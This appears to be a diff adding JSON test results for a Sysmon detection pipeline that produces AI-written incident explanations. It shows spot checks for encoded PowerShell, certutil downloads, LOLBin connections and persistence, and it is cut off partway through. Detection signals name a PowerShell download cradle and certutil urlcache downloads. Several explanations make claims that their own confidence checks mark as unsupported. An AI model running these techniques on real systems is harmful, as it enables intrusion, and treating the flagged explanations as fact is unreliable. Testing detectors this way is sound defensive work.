@@ -1,0 +1,756 @@
+{
+  "call_a_real_capture": {
+    "status_code": 200,
+    "body": {
+      "filename": "sysmon_vm_capture.evtx",
+      "records_read": 64558,
+      "events_ingested": 64558,
+      "events_skipped": 0,
+      "rule_matches": 0,
+      "matched_rule_titles": [],
+      "alerts_created": 0,
+      "incident_ids": []
+    }
+  },
+  "call_b_crafted_records": {
+    "status_code": 200,
+    "body": {
+      "filename": "spot_check.evtx",
+      "records_read": 10,
+      "events_ingested": 10,
+      "events_skipped": 0,
+      "rule_matches": 10,
+      "matched_rule_titles": [
+        "Suspicious Encoded PowerShell Command",
+        "PowerShell Execution Policy Bypass",
+        "Certutil Download via urlcache/split Flags",
+        "Suspicious Network Connection from LOLBin",
+        "Suspicious Executable Written to Public or Temp Directory",
+        "Registry Run Key Persistence",
+        "Registry IFEO Debugger Hijack",
+        "Scheduled Task Creation via schtasks.exe",
+        "Suspicious Scheduled Task via PowerShell Cmdlet",
+        "Suspicious Mshta Execution"
+      ],
+      "alerts_created": 10,
+      "incident_ids": [
+        3,
+        4,
+        5,
+        6,
+        7,
+        8,
+        9,
+        10,
+        11,
+        12
+      ]
+    }
+  },
+  "spot_checks": [
+    {
+      "host": "SPOTCHECK-01",
+      "ground_truth": {
+        "expected_rule_title": "Suspicious Encoded PowerShell Command",
+        "expected_technique_id": "T1059.001"
+      },
+      "incident": {
+        "incident_id": 3,
+        "title": "Suspicious Encoded PowerShell Command on SPOTCHECK-01",
+        "severity": "critical",
+        "mitre_technique_ids": [
+          "T1059.001"
+        ]
+      },
+      "explain_response": {
+        "incident_id": 3,
+        "explanation": "## What happened  \nA PowerShell process was started on **SPOTCHECK‑01** that contained an `-EncodedCommand` (or `-enc`) flag. The command line was unusually long and heavy with base‑64 characters, which is a common sign of an attacker trying to hide malicious code. The detection system marked this as **critical** because encoded PowerShell is rarely used in normal admin work.\n\n## Why it matters  \nThe activity maps to **MITRE ATT&CK T1059.001 – PowerShell**.  \n- **T1059.001 (PowerShell)**: adversaries abuse PowerShell to execute code, download additional payloads, or run commands in memory without touching disk.  \n- Using an encoded command lets the attacker conceal the actual script, making it harder for defenders to see what is being run. If the decoded script contacts a remote server (download‑cradle) or creates persistence, it can lead to full compromise of the host.\n\n## Recommended next steps  \n1. **Decode the base‑64 command** (do not execute it) and review the script for download or C2 URLs.  \n2. **Identify the parent process** from Sysmon Event ID 1 – if PowerShell was launched by Outlook, Word, Excel, or a browser, it strongly suggests a phishing or macro‑based delivery.  \n3. **Contain the host**: isolate SPOTCHECK‑01 from the network, terminate the PowerShell process tree, and block any observed C2 domains/IPs at the perimeter or DNS.  \n4. **Check for follow‑on artifacts** such as new scheduled tasks, Run‑key entries, or services created by the same process chain, and remove them. Consider enabling PowerShell Script Block Logging (Event 4104) to capture future encoded scripts.  \n\n**Confidence check:**\n- The draft states that the PowerShell process was started on **SPOTCHECK‑01**; the source chunks do not mention this specific host.  \n- It claims the detection system marked the activity as **critical** because encoded PowerShell is rarely used in normal admin work; the sources provide no information about a “critical” classification or the rarity of encoded PowerShell.  \n- The draft says that using an encoded command lets the attacker conceal the script, making it harder for defenders to see what is being run; the sources only list `-EncodedCommand` as a detection signal and do not explicitly describe it as concealment.  \n- It asserts that a decoded script contacting a remote server or creating persistence “can lead to full compromise of the host”; the sources discuss download‑cradle patterns and persistence artifacts but do not state that this results in full host compromise.",
+        "recommended_response": "1. **Decode the base‑64 command** (do not execute it) and review the script for download or C2 URLs.  \n2. **Identify the parent process** from Sysmon Event ID 1 – if PowerShell was launched by Outlook, Word, Excel, or a browser, it strongly suggests a phishing or macro‑based delivery.  \n3. **Contain the host**: isolate SPOTCHECK‑01 from the network, terminate the PowerShell process tree, and block any observed C2 domains/IPs at the perimeter or DNS.  \n4. **Check for follow‑on artifacts** such as new scheduled tasks, Run‑key entries, or services created by the same process chain, and remove them. Consider enabling PowerShell Script Block Logging (Event 4104) to capture future encoded scripts.",
+        "sources": [
+          {
+            "chunk_id": "playbook:T1059_001_powershell_execution:0",
+            "document": "Suspicious PowerShell Execution Response Playbook\n\n## Detection Context\nAttackers frequently use PowerShell for execution because it is installed by default on\nWindows, runs .NET code directly in memory, and can be heavily obfuscated. Common signals\nin Sysmon Event ID 1 (process creation) include: `-EncodedCommand`/`-enc` flags, `-NoProfile\n-NonInteractive -WindowStyle Hidden` combinations, `IEX (New-Object Net.WebClient).DownloadString(...)`\ndownload-cradle patterns, and unusually long or base64-heavy command lines. PowerShell spawned\nas a child of Office applications (WINWORD.EXE, EXCEL.EXE) or a script host is a strong\nindicator of malicious macro or phishing-driven execution.",
+            "metadata": {
+              "technique_id": "T1059.001",
+              "title": "Suspicious PowerShell Execution Response Playbook",
+              "source_type": "playbook",
+              "source_file": "T1059_001_powershell_execution.md"
+            },
+            "score": 0.5419784825327659
+          },
+          {
+            "chunk_id": "playbook:T1059_001_powershell_execution:2",
+            "document": "Suspicious PowerShell Execution Response Playbook\n\nront-desk account running an encoded PowerShell one-liner at 2am is anomalous).\n5. Check for related ront-desk account running an encoded PowerShell one-liner at 2am is anomalous).\n5. Check for related persistence artifacts created by the same process tree (scheduled\n   tasks, registry Run keys, new services) in the minutes following execution. ## Containment\n- Isolate the host from the network if the decoded script shows C2/download behavior.\n- Kill the PowerShell process tree and any spawned child processes.\n- Block identified C2 domains/IPs at the perimeter/DNS layer. ## Remediation\n- Reset credentials for the affected user if credential theft is suspected.\n- Remove any persistence mechanisms created by the malicious script.\n- Consider enabling PowerShell Script Block Logging (Event ID 4104) and Constrained\n  Language Mode to reduce blast radius of future encoded/obfuscated execution.",
+            "metadata": {
+              "title": "Suspicious PowerShell Execution Response Playbook",
+              "technique_id": "T1059.001",
+              "source_file": "T1059_001_powershell_execution.md",
+              "source_type": "playbook"
+            },
+            "score": 0.5329467017910775
+          },
+          {
+            "chunk_id": "playbook:T1059_001_powershell_execution:1",
+            "document": "Suspicious PowerShell Execution Response Playbook\n\n, EXCEL.EXE) or a script host is a strong\nindicator of malicious macro or phishing-driven execution. ## Investigation Steps\n1. Decode any base64/encoded command block and read the underlying script before doing\n   anything else — do not run it, just read it.\n2. Identify the parent process (Event ID 1 `ParentImage`). PowerShell spawned by\n   `outlook.exe`, `winword.exe`, `excel.exe`, or a browser strongly suggests phishing/drive-by\n   delivery rather than legitimate admin activity.\n3. Check the full command line for download cradles (`DownloadString`, `Invoke-WebRequest`,\n   `IEX`, `Net.WebClient`) and note any URLs or IPs contacted — these become indicators to\n   block and pivot on across other hosts.\n4. Review the logged-on user and whether this activity fits their normal role (e.g. a\n   front-desk account running an encoded PowerShell one-liner at 2am is anomalous).\n5. Check for related",
+            "metadata": {
+              "technique_id": "T1059.001",
+              "source_file": "T1059_001_powershell_execution.md",
+              "title": "Suspicious PowerShell Execution Response Playbook",
+              "source_type": "playbook"
+            },
+            "score": 0.5046475737658951
+          },
+          {
+            "chunk_id": "mitre:T1059.001:0",
+            "document": "PowerShell Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems). PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.",
+            "metadata": {
+              "source_type": "mitre_technique",
+              "technique_name": "PowerShell",
+              "technique_id": "T1059.001",
+              "tactics": "execution"
+            },
+            "score": 0.4332275493952322
+          },
+          {
+            "chunk_id": "mitre:T1059.001:1",
+            "document": "n executables from the Internet, which can be executed from disk or in memory without touching disk. A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack) PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)",
+            "metadata": {
+              "technique_name": "PowerShell",
+              "technique_id": "T1059.001",
+              "source_type": "mitre_technique",
+              "tactics": "execution"
+            },
+            "score": 0.4204594113403438
+          }
+        ]
+      }
+    },
+    {
+      "host": "SPOTCHECK-02",
+      "ground_truth": {
+        "expected_rule_title": "PowerShell Execution Policy Bypass",
+        "expected_technique_id": "T1059.001"
+      },
+      "incident": {
+        "incident_id": 4,
+        "title": "PowerShell Execution Policy Bypass on SPOTCHECK-02",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1059.001"
+        ]
+      },
+      "explain_response": {
+        "incident_id": 4,
+        "explanation": "## What happened  \nA PowerShell command was run on host **SPOTCHECK‑02** that attempted to bypass the PowerShell execution policy. The command was flagged as suspicious because it used an encoded‑command flag (e.g., `-EncodedCommand` or `-enc`) and ran at an unusual time.  \n\n## Why it matters  \nThe activity maps to **MITRE ATT&CK technique T1059.001 – PowerShell**. This technique is used by attackers to execute malicious code, often obfuscated, because PowerShell is built‑in to Windows and can run .NET code directly in memory. Bypassing the execution policy lets the attacker run scripts that would otherwise be blocked, enabling actions such as downloading additional payloads, establishing C2, or creating persistence.  \n\n## Recommended next steps  \n1. **Decode the PowerShell command** (base64 or other encoding) and review the script text without executing it. Look for download‑cradle patterns (`DownloadString`, `Invoke‑WebRequest`, `IEX`) and note any URLs or IPs.  \n2. **Identify the parent process** (e.g., Outlook, Word, Excel, or a browser). A legitimate admin tool would have a different parent; a macro‑related parent suggests phishing or drive‑by delivery.  \n3. **Contain the host**: isolate SPOTCHECK‑02 from the network, kill the PowerShell process tree and any children, and block any C2 domains/IPs discovered.  \n4. **Remediate**: remove any persistence artifacts the script may have created (scheduled tasks, Run keys, services) and reset credentials for the affected account if theft is suspected. Consider enabling PowerShell Script Block Logging (Event ID 4104) and Constrained Language Mode to reduce future risk.\n\n**Confidence check:**\n- The draft states a PowerShell command was run on host **SPOTCHECK‑02**; the source chunks do not mention this specific host.  \n- The draft claims the command “bypassed the PowerShell execution policy,” but the provided sources never discuss bypassing the execution policy.",
+        "recommended_response": "1. **Decode the PowerShell command** (base64 or other encoding) and review the script text without executing it. Look for download‑cradle patterns (`DownloadString`, `Invoke‑WebRequest`, `IEX`) and note any URLs or IPs.  \n2. **Identify the parent process** (e.g., Outlook, Word, Excel, or a browser). A legitimate admin tool would have a different parent; a macro‑related parent suggests phishing or drive‑by delivery.  \n3. **Contain the host**: isolate SPOTCHECK‑02 from the network, kill the PowerShell process tree and any children, and block any C2 domains/IPs discovered.  \n4. **Remediate**: remove any persistence artifacts the script may have created (scheduled tasks, Run keys, services) and reset credentials for the affected account if theft is suspected. Consider enabling PowerShell Script Block Logging (Event ID 4104) and Constrained Language Mode to reduce future risk.",
+        "sources": [
+          {
+            "chunk_id": "playbook:T1059_001_powershell_execution:2",
+            "document": "Suspicious PowerShell Execution Response Playbook\n\nront-desk account running an encoded PowerShell one-liner at 2am is anomalous).\n5. Check for related ront-desk account running an encoded PowerShell one-liner at 2am is anomalous).\n5. Check for related persistence artifacts created by the same process tree (scheduled\n   tasks, registry Run keys, new services) in the minutes following execution. ## Containment\n- Isolate the host from the network if the decoded script shows C2/download behavior.\n- Kill the PowerShell process tree and any spawned child processes.\n- Block identified C2 domains/IPs at the perimeter/DNS layer. ## Remediation\n- Reset credentials for the affected user if credential theft is suspected.\n- Remove any persistence mechanisms created by the malicious script.\n- Consider enabling PowerShell Script Block Logging (Event ID 4104) and Constrained\n  Language Mode to reduce blast radius of future encoded/obfuscated execution.",
+            "metadata": {
+              "source_type": "playbook",
+              "source_file": "T1059_001_powershell_execution.md",
+              "title": "Suspicious PowerShell Execution Response Playbook",
+              "technique_id": "T1059.001"
+            },
+            "score": 0.46703356691299214
+          },
+          {
+            "chunk_id": "playbook:T1059_001_powershell_execution:0",
+            "document": "Suspicious PowerShell Execution Response Playbook\n\n## Detection Context\nAttackers frequently use PowerShell for execution because it is installed by default on\nWindows, runs .NET code directly in memory, and can be heavily obfuscated. Common signals\nin Sysmon Event ID 1 (process creation) include: `-EncodedCommand`/`-enc` flags, `-NoProfile\n-NonInteractive -WindowStyle Hidden` combinations, `IEX (New-Object Net.WebClient).DownloadString(...)`\ndownload-cradle patterns, and unusually long or base64-heavy command lines. PowerShell spawned\nas a child of Office applications (WINWORD.EXE, EXCEL.EXE) or a script host is a strong\nindicator of malicious macro or phishing-driven execution.",
+            "metadata": {
+              "source_file": "T1059_001_powershell_execution.md",
+              "title": "Suspicious PowerShell Execution Response Playbook",
+              "technique_id": "T1059.001",
+              "source_type": "playbook"
+            },
+            "score": 0.4586804171873927
+          },
+          {
+            "chunk_id": "playbook:T1059_001_powershell_execution:1",
+            "document": "Suspicious PowerShell Execution Response Playbook\n\n, EXCEL.EXE) or a script host is a strong\nindicator of malicious macro or phishing-driven execution. ## Investigation Steps\n1. Decode any base64/encoded command block and read the underlying script before doing\n   anything else — do not run it, just read it.\n2. Identify the parent process (Event ID 1 `ParentImage`). PowerShell spawned by\n   `outlook.exe`, `winword.exe`, `excel.exe`, or a browser strongly suggests phishing/drive-by\n   delivery rather than legitimate admin activity.\n3. Check the full command line for download cradles (`DownloadString`, `Invoke-WebRequest`,\n   `IEX`, `Net.WebClient`) and note any URLs or IPs contacted — these become indicators to\n   block and pivot on across other hosts.\n4. Review the logged-on user and whether this activity fits their normal role (e.g. a\n   front-desk account running an encoded PowerShell one-liner at 2am is anomalous).\n5. Check for related",
+            "metadata": {
+              "source_type": "playbook",
+              "title": "Suspicious PowerShell Execution Response Playbook",
+              "source_file": "T1059_001_powershell_execution.md",
+              "technique_id": "T1059.001"
+            },
+            "score": 0.4326548413497275
+          },
+          {
+            "chunk_id": "mitre:T1059.001:0",
+            "document": "PowerShell Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems). PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.",
+            "metadata": {
+              "technique_id": "T1059.001",
+              "source_type": "mitre_technique",
+              "technique_name": "PowerShell",
+              "tactics": "execution"
+            },
+            "score": 0.4176275020735485
+          },
+          {
+            "chunk_id": "mitre:T1059.001:1",
+            "document": "n executables from the Internet, which can be executed from disk or in memory without touching disk. A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack) PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)",
+            "metadata": {
+              "tactics": "execution",
+              "technique_id": "T1059.001",
+              "technique_name": "PowerShell",
+              "source_type": "mitre_technique"
+            },
+            "score": 0.41319821397820944
+          }
+        ]
+      }
+    },
+    {
+      "host": "SPOTCHECK-03",
+      "ground_truth": {
+        "expected_rule_title": "Certutil Download via urlcache/split Flags",
+        "expected_technique_id": "T1105"
+      },
+      "incident": {
+        "incident_id": 5,
+        "title": "Certutil Download via urlcache/split Flags on SPOTCHECK-03",
+        "severity": "critical",
+        "mitre_technique_ids": [
+          "T1105"
+        ]
+      },
+      "explain_response": {
+        "incident_id": 5,
+        "explanation": "## What happened  \nOn the Windows host **SPOTCHECK‑03** a `certutil` command was observed using the `urlcache` and `split` flags to pull a file from a remote URL. This is a known way for attackers to download tools or payloads onto a compromised system.\n\n## Why it matters  \nThe activity maps to **MITRE ATT&CK technique T1105 – Ingress Tool Transfer**.  \n- **Ingress Tool Transfer** describes adversaries moving malicious files into a victim environment, often using built‑in utilities such as `certutil`, `curl`, or PowerShell.  \n- By downloading a tool, the attacker can later execute it to gain persistence, move laterally, or exfiltrate data. The use of `certutil` is a classic “living‑off‑the‑land” technique that avoids needing external malware binaries.\n\n## Recommended next steps  \n1. **Isolate the host** (e.g., place SPOTCHECK‑03 on a quarantine VLAN) to stop any further download or command execution.  \n2. **Audit the `certutil` event logs** (Windows Event ID 4688 for process creation, 5145 for file share access) to capture the exact command line, source URL, and timestamps.  \n3. **Hash‑verify any newly created files** in the download location (use `certutil -hashfile`) and compare against known good baselines or threat intel.  \n4. **Search for lateral movement** – look for other hosts showing the same `certutil` usage or evidence of the transferred tool (e.g., new scheduled tasks, services, or DLLs).  \n\nThese steps will confirm whether the download was malicious, contain the potential breach, and help you understand the attacker’s next moves.\n\n**Confidence check:**\n- The draft states that on the Windows host **SPOTCHECK‑03** a `certutil` command was observed using the `urlcache` and `split` flags to pull a file from a remote URL – the sources do not mention this host, the specific flags, or that such a command was observed.  \n- The claim that “by downloading a tool, the attacker can later execute it to gain persistence, move laterally, or exfiltrate data” is not directly supported by the provided sources.  \n- The description of `certutil` as a “classic living‑off‑the‑land technique that avoids needing external malware binaries” is not stated in the sources.  \n- The recommendation to “isolate the host (e.g., place SPOTCHECK‑03 on a quarantine VLAN)” is not found in the source material.  \n- The suggestion to “audit the `certutil` event logs (Windows Event ID 4688 for process creation, 5145 for file share access)” is not mentioned in the sources.  \n- The advice to “search for lateral movement … new scheduled tasks, services, or DLLs” goes beyond what the sources provide about lateral tool transfer.",
+        "recommended_response": "1. **Isolate the host** (e.g., place SPOTCHECK‑03 on a quarantine VLAN) to stop any further download or command execution.  \n2. **Audit the `certutil` event logs** (Windows Event ID 4688 for process creation, 5145 for file share access) to capture the exact command line, source URL, and timestamps.  \n3. **Hash‑verify any newly created files** in the download location (use `certutil -hashfile`) and compare against known good baselines or threat intel.  \n4. **Search for lateral movement** – look for other hosts showing the same `certutil` usage or evidence of the transferred tool (e.g., new scheduled tasks, services, or DLLs).  \n\nThese steps will confirm whether the download was malicious, contain the potential breach, and help you understand the attacker’s next moves.",
+        "sources": [
+          {
+            "chunk_id": "mitre:T1105:1",
+            "document": "a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). On Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)  A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).(Citation: Google Cloud Threat Intelligence COSCMICENERGY 2023)",
+            "metadata": {
+              "tactics": "command-and-control",
+              "technique_name": "Ingress Tool Transfer",
+              "source_type": "mitre_technique",
+              "technique_id": "T1105"
+            },
+            "score": 0.4053450251853324
+          },
+          {
+            "chunk_id": "mitre:T1105:2",
+            "document": "lue (e.g., via `certutil -hashfile`).(Citation: Google Cloud Threat Intelligence COSCMICENERGY 2023) Adversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204) (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms)",
+            "metadata": {
+              "technique_name": "Ingress Tool Transfer",
+              "technique_id": "T1105",
+              "source_type": "mitre_technique",
+              "tactics": "command-and-control"
+            },
+            "score": 0.3895144442364213
+          },
+          {
+            "chunk_id": "mitre:T1105:3",
+            "document": "th [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms) Files can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync)",
+            "metadata": {
+              "technique_id": "T1105",
+              "tactics": "command-and-control",
+              "source_type": "mitre_technique",
+              "technique_name": "Ingress Tool Transfer"
+            },
+            "score": 0.3532495402045945
+          },
+          {
+            "chunk_id": "mitre:T1105:0",
+            "document": "Ingress Tool Transfer Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)).",
+            "metadata": {
+              "technique_name": "Ingress Tool Transfer",
+              "source_type": "mitre_technique",
+              "tactics": "command-and-control",
+              "technique_id": "T1105"
+            },
+            "score": 0.34224099053063173
+          }
+        ]
+      }
+    },
+    {
+      "host": "SPOTCHECK-04",
+      "ground_truth": {
+        "expected_rule_title": "Suspicious Network Connection from LOLBin",
+        "expected_technique_id": "T1071.001"
+      },
+      "incident": {
+        "incident_id": 6,
+        "title": "Suspicious Network Connection from LOLBin on SPOTCHECK-04",
+        "severity": "critical",
+        "mitre_technique_ids": [
+          "T1071.001"
+        ]
+      },
+      "explain_response": {
+        "incident_id": 6,
+        "explanation": "## What happened  \nA legitimate Windows binary (a “LOLBin”) on host **SPOTCHECK‑04** opened an outbound connection using HTTP/HTTPS. The connection was flagged because the process is not a web browser, it contacted an IP address directly (no domain name), and the traffic pattern matches typical C2 “beaconing”.\n\n## Why it matters  \nThe activity maps to **MITRE ATT&CK T1071.001 – Web Protocols**. This technique lets attackers hide command‑and‑control (C2) traffic inside normal web traffic (HTTP/HTTPS) to evade network defenses. When a non‑browser process (e.g., PowerShell, rundll32, a temporary unsigned binary) talks to an external IP on ports 80/443, it often indicates an adversary is trying to receive commands or exfiltrate data.\n\n## Recommended next steps  \n1. **Identify the offending process** – pull the Sysmon Event ID 3 record, note the `Image` (executable path) and its parent process. Verify whether that binary should be making web requests.  \n2. **Investigate the destination** – resolve the IP to a domain (if any), check reputation, age, hosting provider, and geographic location.  \n3. **Look for beaconing** – review the timeline for repeated connections at regular intervals to the same endpoint; this strengthens the C2 hypothesis.  \n4. **Containment** – block the destination IP/domain at the firewall/DNS, isolate SPOTCHECK‑04 from the network, and terminate the suspicious process. Capture memory and disk images before re‑imaging for forensic analysis.  \n\nThese steps follow the “Suspicious Web‑Protocol C2 / Network Connection Response Playbook” and will help determine if the host is compromised and stop any further C2 traffic.\n\n**Confidence check:**\n- The draft states the activity occurred on host **SPOTCHECK‑04**, but none of the source chunks mention this host name.",
+        "recommended_response": "1. **Identify the offending process** – pull the Sysmon Event ID 3 record, note the `Image` (executable path) and its parent process. Verify whether that binary should be making web requests.  \n2. **Investigate the destination** – resolve the IP to a domain (if any), check reputation, age, hosting provider, and geographic location.  \n3. **Look for beaconing** – review the timeline for repeated connections at regular intervals to the same endpoint; this strengthens the C2 hypothesis.  \n4. **Containment** – block the destination IP/domain at the firewall/DNS, isolate SPOTCHECK‑04 from the network, and terminate the suspicious process. Capture memory and disk images before re‑imaging for forensic analysis.  \n\nThese steps follow the “Suspicious Web‑Protocol C2 / Network Connection Response Playbook” and will help determine if the host is compromised and stop any further C2 traffic.",
+        "sources": [
+          {
+            "chunk_id": "playbook:T1071_001_web_protocol_c2:0",
+            "document": "Suspicious Web-Protocol C2 / Network Connection Response Playbook\n\n## Detection Context\nMalware commonly blends command-and-control (C2) traffic into HTTP/HTTPS to evade network\ndetection, since these ports are almost never blocked outbound. In Sysmon Event ID 3\n(network connection), suspicious signals include: a non-browser process (e.g. `powershell.exe`,\n`rundll32.exe`, `regsvr32.exe`, an unsigned binary in `%TEMP%`) making outbound connections\non port 80/443; connections to IP-literal destinations instead of domains; periodic\n\"beaconing\" connections at regular intervals; connections to newly-registered or low-reputation\ndomains; and unusual destination countries/ASNs relative to the organization's normal traffic.",
+            "metadata": {
+              "title": "Suspicious Web-Protocol C2 / Network Connection Response Playbook",
+              "technique_id": "T1071.001",
+              "source_file": "T1071_001_web_protocol_c2.md",
+              "source_type": "playbook"
+            },
+            "score": 0.4740233625496585
+          },
+          {
+            "chunk_id": "playbook:T1071_001_web_protocol_c2:1",
+            "document": "Suspicious Web-Protocol C2 / Network Connection Response Playbook\n\nation\ndomains; and unusual destination countries/ASNs relative to the organization's normal traffic. ## Investigation Steps\n1. Identify the initiating process (`Image`) and confirm whether it is expected to make\n   outbound web requests at all.\n2. Resolve the destination IP/domain and check reputation (age of domain, hosting provider,\n   any open threat-intel hits).\n3. Look for beaconing patterns — repeated connections at fixed intervals to the same\n   destination are a strong C2 indicator versus normal bursty user browsing.\n4. Correlate with the process's parent chain and any recent file-creation or\n   scheduled-task events on the same host to find the initial infection vector.\n5. Check whether other hosts on the network are contacting the same destination\n   (potential lateral spread or shared C2 infrastructure).",
+            "metadata": {
+              "source_type": "playbook",
+              "title": "Suspicious Web-Protocol C2 / Network Connection Response Playbook",
+              "source_file": "T1071_001_web_protocol_c2.md",
+              "technique_id": "T1071.001"
+            },
+            "score": 0.4633091083901253
+          },
+          {
+            "chunk_id": "playbook:T1071_001_web_protocol_c2:2",
+            "document": "Suspicious Web-Protocol C2 / Network Connection Response Playbook\n\ntwork are contacting the same destination\n   (potential lateral spread or shared C2 infrastructure). ## Containment\n- Block the destination IP/domain at the firewall/proxy/DNS layer.\n- Isolate the host from the network to stop further C2 communication.\n- Kill the offending process. ## Remediation\n- Capture memory/disk artifacts from the host before reimaging if the intrusion is\n  confirmed active.\n- Add the C2 indicators (IP, domain, JA3/TLS fingerprint if available) to blocklists.\n- Review egress filtering rules — restricting outbound traffic to known-good destinations\n  reduces the impact of this technique going forward.",
+            "metadata": {
+              "technique_id": "T1071.001",
+              "source_file": "T1071_001_web_protocol_c2.md",
+              "source_type": "playbook",
+              "title": "Suspicious Web-Protocol C2 / Network Connection Response Playbook"
+            },
+            "score": 0.45830111763170994
+          },
+          {
+            "chunk_id": "mitre:T1071.001:0",
+            "document": "Web Protocols\n\nAdversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S(Citation: CrowdStrike Putter Panda) and WebSocket(Citation: Brazking-Websockets) that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
+            "metadata": {
+              "source_type": "mitre_technique",
+              "technique_id": "T1071.001",
+              "tactics": "command-and-control",
+              "technique_name": "Web Protocols"
+            },
+            "score": 0.38447909699977706
+          }
+        ]
+      }
+    },
+    {
+      "host": "SPOTCHECK-05",
+      "ground_truth": {
+        "expected_rule_title": "Suspicious Executable Written to Public or Temp Directory",
+        "expected_technique_id": "T1105"
+      },
+      "incident": {
+        "incident_id": 7,
+        "title": "Suspicious Executable Written to Public or Temp Directory on SPOTCHECK-05",
+        "severity": "critical",
+        "mitre_technique_ids": [
+          "T1105"
+        ]
+      },
+      "explain_response": {
+        "incident_id": 7,
+        "explanation": "## What happened\nA file that looks like an executable was created in a public or temporary folder on the host **SPOTCHECK‑05**.  \nThe creation was flagged because it matches the behavior of **Ingress Tool Transfer (T1105)** – moving a tool or payload from an external source onto a compromised machine.\n\n## Why it matters\n**T1105 – Ingress Tool Transfer** (MITRE ATT&CK) describes how attackers download additional tools or malware onto a victim host.  \nTypical methods include using built‑in utilities such as `certutil`, PowerShell (`Invoke‑WebRequest`, `IEX …`), `curl`, `wget`, or package managers. Once the tool is on the system, the attacker can execute it to gain further control, move laterally, or exfiltrate data. The presence of a new executable in a public/temp directory is a strong indicator that an adversary is staging a malicious payload for later use.\n\n## Recommended next steps\n1. **Identify the file** – locate the exact path, name, hash, and creation timestamp. Compare its hash against known good files or malware databases.  \n2. **Determine the source** – check process creation logs, PowerShell or `certutil` command lines, and network logs to see how the file was downloaded (e.g., `Invoke‑WebRequest`, `wget`, etc.).  \n3. **Quarantine or delete** – isolate the host from the network and move the suspicious file to a safe location for deeper analysis (sandbox or malware analysis tool).  \n4. **Search for related activity** – query other endpoints for the same file name or hash, and look for lateral movement (T1570) or additional tool transfers that may indicate a broader compromise.  \n\n**Confidence check:**\n- The draft states that a file was created in a public or temporary folder on the host **SPOTCHECK‑05**; the source chunks do not mention this host or any specific file creation event.  \n- It claims the creation was flagged because it matches the behavior of **Ingress Tool Transfer (T1105)**; the sources describe T1105 but do not say this particular event was flagged as such.  \n- The explanation says that once the tool is on the system, the attacker can execute it to gain further control, move laterally, or exfiltrate data; the sources do not mention execution for control, lateral movement, or exfiltration.  \n- It asserts that the presence of a new executable in a public/temp directory is a strong indicator that an adversary is staging a malicious payload; this inference is not found in the provided sources.  \n- The recommendation to “check process creation logs, PowerShell or `certutil` command lines, and network logs” is not supported by the source material.  \n- The advice to “quarantine or delete the host and move the suspicious file to a safe location for deeper analysis (sandbox or malware analysis tool)” is not mentioned in the sources.  